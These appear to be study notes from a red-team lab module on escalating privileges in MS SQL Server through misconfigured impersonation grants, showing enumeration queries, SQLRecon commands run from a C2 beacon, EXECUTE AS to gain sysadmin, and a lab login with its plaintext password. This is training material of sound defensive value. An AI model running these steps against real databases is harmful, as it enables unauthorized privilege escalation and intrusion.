MS SQL impersonation, or context switching, is a means which allows the executing user to assume the permissions of another user without needing to know their password.  One handy use case for the feature is to allow administrators to impersonate a user for testing purposes, e.g. a user is having a problem and they want to eliminate permissions as an issue.

Impersonations must be explicitly granted through securable configurations.

- this `module` was completed by setting up a `proxychains 1080 socks5` on `WKSTN-2` and utilizing `proxychains mssqlclient.py` to login as `DEV\BFarmer` with password `Sup3rman`

![[Pasted image 20231212173135.png]]

In this example, `DEV\Domain Users` have been granted the ability to impersonate the `DEV\mssql_svc` account.  This is clearly a security issue because it gives all Domain Users sysadmin privileges on this instance.

We can discover accounts to impersonate manually using the following queries:
```sql
SQL> SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
     class   class_desc                                                        major_id      minor_id   grantee_principal_id   grantor_principal_id   type   permission_name                                                                                                                    state   state_desc

----------   ------------------------------------------------------------   -----------   -----------   --------------------   --------------------   ----   --------------------------------------------------------------------------------------------------------------------------------   -----   ------------------------------------------------------------

       101   SERVER_PRINCIPAL                                                       267             0                    268                    267   b'IM  '   IMPERSONATE                                                                                                                         b'G'   GRANT

SQL>
```
This shows that the `grantee_principal_id`, 268, is allowed to impersonate the `grantor_principal_id`, 267.  The IDs don't mean much, so we can look them up with:
```sql
SQL> SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
name                                                                                                                               principal_id   type_desc                                                      is_disabled

--------------------------------------------------------------------------------------------------------------------------------   ------------   ------------------------------------------------------------   -----------

sa                                                                                                                                            1   SQL_LOGIN                                                                1

public                                                                                                                                        2   SERVER_ROLE                                                              0

sysadmin                                                                                                                                      3   SERVER_ROLE
          0

securityadmin                                                                                                                                 4   SERVER_ROLE
          0

serveradmin                                                                                                                                   5   SERVER_ROLE
          0

setupadmin                                                                                                                                    6   SERVER_ROLE
          0

processadmin                                                                                                                                  7   SERVER_ROLE
          0

diskadmin                                                                                                                                     8   SERVER_ROLE
          0

dbcreator                                                                                                                                     9   SERVER_ROLE
          0

bulkadmin                                                                                                                                    10   SERVER_ROLE
          0

DEV\mssql_svc                                                                                                                               267   WINDOWS_LOGIN
          0

DEV\Domain Users                                                                                                                            268   WINDOWS_GROUP
```
Here, we see that 267 is DEV\mssql_svc and 268 is DEV\Domain Users.
- anyone in the `DEV\Domain Users` group is able to `impersonate` `DEV\mssql_svc`
You can also write your own SQL query that will join these two, or use SQLRecon's impersonate module.
```powershell
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate

[*] Enumerating accounts that can be impersonated on sql-2.dev.cyberbotic.io,1433
name | 
-------
DEV\mssql_svc |
```
We can take advantage of this as bfarmer, who we know is not a sysadmin.
```powershell
SELECT SYSTEM_USER;
DEV\bfarmer

SELECT IS_SRVROLEMEMBER('sysadmin');
0
```
Use `EXECUTE AS` to execute a query in the context of the target.
```powershell
EXECUTE AS login = 'DEV\mssql_svc'; SELECT SYSTEM_USER;
DEV\mssql_svc

EXECUTE AS login = 'DEV\mssql_svc'; SELECT IS_SRVROLEMEMBER('sysadmin');
1
```
SQLRecon modules can also be run in "impersonation mode" by prefixing the module name with an `i` and specifying the principal to impersonate.
```powershell
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc

[*] Determining user permissions on sql-2.dev.cyberbotic.io,1433 as 'DEV\mssql_svc'
[*] Logged in as DEV\mssql_svc
[*] Mapped to the user dbo
[*] [+] Roles:
 |-> User is a member of public role.
 |-> User is NOT a member of db_owner role.
 |-> User is NOT a member of db_accessadmin role.
 |-> User is NOT a member of db_securityadmin role.
 |-> User is NOT a member of db_ddladmin role.
 |-> User is NOT a member of db_backupoperator role.
 |-> User is NOT a member of db_datareader role.
 |-> User is NOT a member of db_datawriter role.
 |-> User is NOT a member of db_denydatareader role.
 |-> User is NOT a member of db_denydatawriter role.
 |-> User is a member of sysadmin role.
 |-> User is a member of setupadmin role.
 |-> User is a member of serveradmin role.
 |-> User is a member of securityadmin role.
 |-> User is a member of processadmin role.
 |-> User is a member of diskadmin role.
 |-> User is a member of dbcreator role.
 |-> User is a member of bulkadmin role.
```